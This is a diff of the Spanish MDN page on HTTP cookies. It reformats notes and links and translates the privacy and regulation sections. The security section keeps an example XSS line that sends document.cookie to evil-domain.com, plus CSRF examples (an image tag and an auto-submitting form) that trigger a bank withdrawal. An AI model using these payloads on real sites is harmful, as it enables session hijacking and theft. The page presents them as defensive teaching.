@@ -18,7 +18,8 @@ Las cookies se utilizan principalmente con tres propósitos:
 
 Las cookies se usaron una vez para el almacenamiento general del lado del cliente. Si bien esto era legítimo cuando eran la única forma de almacenar datos en el cliente, hoy en día se recomienda preferir las API de almacenamiento modernas. Las cookies se envían con cada solicitud, por lo que pueden empeorar el rendimiento (especialmente para las conexiones de datos móviles). Las APIs modernas para el almacenamiento del cliente son la [Web storage API](/es/docs/Web/API/Web_Storage_API) (`localStorage` y `sessionStorage`) e [IndexedDB](/es/docs/Web/API/IndexedDB_API).
 
-> **Nota:** Para ver las cookies almacenadas (y otro tipo de almacenamiento que una página web puede usar), puede habilitar el [Inspector de Almacenamiento](/es/docs/Tools/Storage_Inspector) en Herramientas del desarrollador y seleccionar Cookies en el árbol de almacenamiento.
+> [!NOTE]
+> Para ver las cookies almacenadas (y otro tipo de almacenamiento que una página web puede usar), puede habilitar el [Inspector de Almacenamiento](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/index.html) en Herramientas del desarrollador y seleccionar Cookies en el árbol de almacenamiento.
 
 ## Creando cookies
 
@@ -34,7 +35,8 @@ Set-Cookie: <nombre-cookie>=<valor-cookie>
 
 Este encabezado del servidor le dice al cliente que almacene una cookie.
 
-> **Nota:** Aquí se explica como usar el encabezado `Set-Cookie` en varias aplicaciones del lado del servidor:
+> [!NOTE]
+> Aquí se explica como usar el encabezado `Set-Cookie` en varias aplicaciones del lado del servidor:
 >
 > - [PHP](https://secure.php.net/manual/en/function.setcookie.php)
 > - [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
@@ -70,13 +72,14 @@ En lugar de expirar cuando el cliente se cierra, las _cookies permanentes_ expir
 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
 ```
 
-> **Nota:** Cuando se establece una fecha de expiración, la fecha y hora que se establece es relativa al cliente en el que se establece la cookie, no del servidor.
+> [!NOTE]
+> Cuando se establece una fecha de expiración, la fecha y hora que se establece es relativa al cliente en el que se establece la cookie, no del servidor.
 
 ### Cookies `Secure` y `HttpOnly`
 
 Una cookie segura sólo se envía al servidor con una petición cifrada sobre el protocolo HTTPS. Incluso con `Secure`, no debería almacenarse _nunca_ información sensible en la cookies, ya que son inherentemente inseguras y este flag no puede ofrecer protección real. A partir de Chrome 52 y Firefox 52, los sitios inseguros (`http:`) no pueden establecer cookies con la directiva `Secure`.
 
-Para prevenir ataques cross-site scripting ({{Glossary("XSS")}}), las cookies `HttpOnly` son inaccesibles desde la API de Javascript {{domxref("Document.cookie")}}; Solamente se envían al servidor. Por ejemplo, las cookies que persisten sesiones del lado del servidor no necesitan estar disponibles para JavaScript, por lo que debería establecerse el flag `HttpOnly`.
+Para prevenir ataques cross-site scripting ([XSS](/es/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss)), las cookies `HttpOnly` son inaccesibles desde la API de Javascript {{domxref("Document.cookie")}}; Solamente se envían al servidor. Por ejemplo, las cookies que persisten sesiones del lado del servidor no necesitan estar disponibles para JavaScript, por lo que debería establecerse el flag `HttpOnly`.
 
 ```
 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
@@ -102,7 +105,7 @@ Por ejemplo, si se establece `Path=/docs` estas rutas coincidirán:
 
 Las cookies `SameSite` permiten a los servidores requerir que una cookie no sea enviada con solicitudes cross-site (donde {{Glossary("Site")}} es definido por el dominio registrabe), lo que proporciona algo de protección contra ataques cross-site request forgery ({{Glossary("CSRF")}}).
 
-Las cookies `SameSite` son relativamente nuevas y [soportadas por los principales navegadores](/es/docs/Web/HTTP/headers/Set-Cookie#Browser_compatibility).
+Las cookies `SameSite` son relativamente nuevas y [soportadas por los principales navegadores](/es/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility).
 
 Aquí hay un ejemplo:
 
@@ -130,18 +133,20 @@ console.log(document.cookie);
 // logs "yummy_cookie=choco; tasty_cookie=strawberry"
 ```
 
-Tenga en cuenta las cuestiones de seguridad en la siguiente sección [Seguridad](/es/docs/Web/HTTP/Cookies#Security). Las cookies disponibles para JavaScript pueden ser robadas por medio de XSS.
+Tenga en cuenta las cuestiones de seguridad en la siguiente sección [Seguridad](#security). Las cookies disponibles para JavaScript pueden ser robadas por medio de XSS.
 
 ## Seguridad
 
-> **Nota:** Nunca se debe almacenar ni transmitir información confidecial o sensible mediante Cookies HTTP, ya que todo el mecanismo es inherentemente inseguro.
+> [!NOTE]
+> Nunca se debe almacenar ni transmitir información confidecial o sensible mediante Cookies HTTP, ya que todo el mecanismo es inherentemente inseguro.
 
 ### Secuestro de session y XSS
 
-Las cookies son utilizadas a menudo en aplicaciones web para identificar a un usuario y su sesión autenticada, así que el robo de una cookie puede implicar el secuestro de la sesión del usuario autenticado. Las formas más comunes de robar cookies incluyen ingeniería social o la explotación de una vulnerabilidad {{Glossary("XSS")}} de la aplicación.
+Las cookies son utilizadas a menudo en aplicaciones web para identificar a un usuario y su sesión autenticada, así que el robo de una cookie puede implicar el secuestro de la sesión del usuario autenticado. Las formas más comunes de robar cookies incluyen ingeniería social o la explotación de una vulnerabilidad [XSS](/es/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss) de la aplicación.
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 El atributo cookie `HttpOnly` puede ayudar a mitigar este ataque evitando el acceso al valor de la cookie a través de JavaScript.
@@ -151,18 +156,21 @@ El atributo cookie `HttpOnly` puede ayudar a mitigar este ataque evitando el acc
 [Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) menciona buenos ejemplos para {{Glossary("CSRF")}}. En este caso, alguien puede incluir una imagen que no es realmente una imagen (por ejemplo un chat o foro sin filtrar), que en lugar de esto es realmente una solicitud de tu banco para retirar tu dinero:
 
 ```html
-<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+<img
+  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
 ```
 
 Ahora, si tu tienes una sesión iniciada en tu tu cuenta bancaria y las cookies permanecen siendo válidas (y no hay otra validación mas que esa), se realizará la transferencia desde tu cuenta tan pronto como se cargue el html que contiene la imagen. Para los endpoints que requieren una petición de tipo POST, se puede disparar un evento de tipo envío de formulario (posiblemente en un iframe invisible) cuando la página se carga:
 
 ```html
 <form action="https://bank.example.com/withdraw" method="POST">
-  <input type="hidden" name="account" value="bob">
-  <input type="hidden" name="amount" value="1000000">
-  <input type="hidden" name="for" value="mallory">
+  <input type="hidden" name="account" value="bob" />
+  <input type="hidden" name="amount" value="1000000" />
+  <input type="hidden" name="for" value="mallory" />
 </form>
-<script>window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }
+</script>
 ```
 
 Se presentan aquí algunas técnicas que se deberían usar para evitar que estas cosas ocurran:
@@ -172,46 +180,56 @@ Se presentan aquí algunas técnicas que se deberían usar para evitar que estas
 
   - Este método de protección recae en la imposibilidad de que un atacante pueda predecir este token autogenerado en cada inicio de sesión. Cabe aclarar que este token debería ser regenerado en cada inicio de sesión.
 
-- Al igual que con {{Glosario ("XSS")}}, el filtrado de entrada es importante.
+- Al igual que con [XSS](/es/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss), el filtrado de entrada es importante.
 - Debería de existir siempre un requerimiento de confirmación para cualquier acción delicada,.
 - Las cookies empleadas en acciones delicadas deberían de tener una vida útil breve.
 - Para más prevención visita [OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>).
 
-## Tracking and privacy
+## Rastreo y privacidad
 
-### Third-party cookies
+### Cookies de terceros
 
-Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, the cookies is said to be a _first-party cookie_. If the domain is different, it is said to be a _third-party cookie_. While first-party cookies are sent only to the server setting them, a web page may contain images or other components stored on servers in other domains (like ad banners). Cookies that are sent through these third-party components are called third-party cookies and are mainly used for advertising and tracking across the web. See for example the [types of cookies used by Google](https://www.google.com/policies/technologies/types/). Most browsers allow third-party cookies by default, but there are add-ons available to block them (for example, [Privacy Badger](https://addons.mozilla.org/en-US/firefox/addon/privacy-badger-firefox/) by the [EFF](https://www.eff.org/)).
+Las Cookies tienen un dominio asociado a ellas. Si este dominio es el mismo que el dominio de la página en la que el cliente se encuentra, se llama _cookie de origen_. Si el dominio es distinto, se denomina _cookie de terceros_. Si bien las cookies de origen se envían únicamente al servidor que las configura, una página web puede contener imágenes u otros componentes almacenados en servidores de otros dominios (como publicidad). Las cookies que se envían a través de estos componentes de terceros se utilizan principalmente para publicidad y seguimiento en la web. Por ejemplo, [los tipos de cookies utilizadas por Google](https://www.google.com/policies/technologies/types/).
 
-If you are not disclosing third-party cookies, consumer trust might get harmed if cookie use is discovered. A clear disclosure (such as in a privacy policy) tends to eliminate any negative effects of a cookie discovery. Some countries also have legislation about cookies. See for example Wikipedia's [cookie statement](https://wikimediafoundation.org/wiki/Cookie_statement).
+Un servidor de terceros puede crear un perfil del historial y los hábitos de navegación de un usuario basándose en las cookies que le envía el mismo navegador al acceder a varios sitios. Firefox, de forma predeterminada, bloquea las cookies de terceros que se sabe que contienen rastreadores. Las cookies de terceros (o simplemente las cookies de seguimiento) también pueden bloquearse mediante otras configuraciones o extensiones del navegador. El bloqueo de cookies puede provocar que algunos componentes de terceros (como los widgets de redes sociales) no funcionen según lo previsto.
 
-### Do-Not-Track
+Hay algunas funciones útiles disponibles para los desarrolladores que desean respetar la privacidad del usuario y minimizar el seguimiento de terceros:
 
-There are no legal or technological requirements for its use, but the {{HTTPHeader("DNT")}} header can be used to signal that a web application should disable either its tracking or cross-site user tracking of an individual user. See the {{HTTPHeader("DNT")}} header for more information.
+- Los servidores pueden (y deberían) configurar el atributo SameSite para especificar si se pueden enviar o no cookies de terceros.
+- Las cookies que tienen un estado de partición independiente (CHIPS) les permiten a los desarrolladores habilitar sus cookies en el almacenamiento particionado, con un contenedor de cookies separado por sitio de nivel superior. Esto permite que los usos válidos sin seguimiento de cookies de terceros sigan funcionando en navegadores que no permiten el uso de cookies para el seguimiento de terceros.
 
-### EU cookie directive
+## Regulaciones relacionadas a las cookies
 
-Requirements for cookies across the EU are defined in [Directive 2009/136/EC](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136) of the European Parliament and came into effect on 25 May 2011. A directive is not a law by itself, but a requirement for EU member states to put laws in place that meet the requirements of the directive. The actual laws can differ from country to country.
+La legislación o normativa que cubre el uso de cookies incluye:
 
-In short the EU directive means that before somebody can store or retrieve any information from a computer, mobile phone or other device, the user must give informed consent to do so. Many websites have added banners since then to inform the user about the use of cookies.
+- El Reglamento General de Privacidad de Datos (RGPD) en la Unión Europea
+- La Directiva sobre la privacidad electrónica en la Unión Europea
+- Ley de Privacidad del Consumidor de California (CCPA)
 
-For more, see [this Wikipedia section](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive) and consult state laws for the latest and most accurate information.
+Estas regulaciones tienen alcance global. Se aplican a cualquier sitio del internet al que accedan usuarios de estas jurisdicciones (la UE y California, con la salvedad de que la ley de California se aplica sólo a entidades con ingresos brutos superiores a 25 millones de dólares, entre otras cosas).
 
-### Zombie cookies and Evercookies
+Estas regulaciones incluyen requisitos tales como:
 
-A more radical approach to cookies are zombie cookies or "Evercookies" which are recreated after their deletion and are intentionally hard to delete forever. They are using the [Web storage API](/es/docs/Web/API/Web_Storage_API), Flash Local Shared Objects and other techniques to recreate themselves whenever the cookie's absence is detected.
+- Notificar a los usuarios que el sitio utiliza cookies.
+- Permitir a los usuarios escoger no recibir algunas o todas las cookies.
+- Permitir a los usuarios utilizar la mayor parte del servicio sin recibir cookies.
 
-- [Evercookie by Samy Kamkar](https://github.com/samyk/evercookie)
-- [Zombie cookies on Wikipedia](https://en.wikipedia.org/wiki/Zombie_cookie)
+Puede haber otras regulaciones que rijan el uso de cookies en tu ubicación. La carga de conocer y cumplir estas regulaciones recae sobre usted. Hay empresas que ofrecen un código de "banner de cookies" que le ayuda a cumplir con estas normativas.
 
-## See also
+## Otras formas de almacenar información en el navegador
+
+Otro enfoque para almacenar datos en el navegador es la [API de almacenamiento web](/es/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API). Las propiedades [window.sessionStorage](/es/docs/Web/API/Window/sessionStorage) y [window.localStorage](/es/docs/Web/API/Window/localStorage) corresponden a cookies de sesión y permanentes en duración, pero tienen límites de almacenamiento mayores que las cookies y nunca se envían a un servidor. Se pueden almacenar cantidades de datos más estructuradas y mayores utilizando la [API IndexedDB](/es/docs/Web/API/IndexedDB_API) o una biblioteca construida sobre ella.
+
+Existen algunas técnicas diseñadas para recrear las cookies después de eliminarlas. Se conocen como cookies "zombies". Estas técnicas violan los principios de privacidad y control del usuario, pueden violar las regulaciones de privacidad de datos y podrían exponer a un sitio web que las utilice a responsabilidad legal.
+
+## Véase También
 
 - {{HTTPHeader("Set-Cookie")}}
 - {{HTTPHeader("Cookie")}}
 - {{domxref("Document.cookie")}}
 - {{domxref("Navigator.cookieEnabled")}}
-- [Inspecting cookies using the Storage Inspector](/es/docs/Tools/Storage_Inspector)
+- [Inspeccionar cookies usando el Storage Inspector](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/index.html)
 - [Cookie specification: RFC 6265](https://tools.ietf.org/html/rfc6265)
 - [Nicholas Zakas article on cookies](https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/)
 - [Nicholas Zakas article on cookies and security](https://www.nczonline.net/blog/2009/05/12/cookies-and-security/)
-- [HTTP cookie on Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie)
+- [HTTP cookies en Wikipedia](<https://es.wikipedia.org/wiki/Cookie_(inform%C3%A1tica)>)
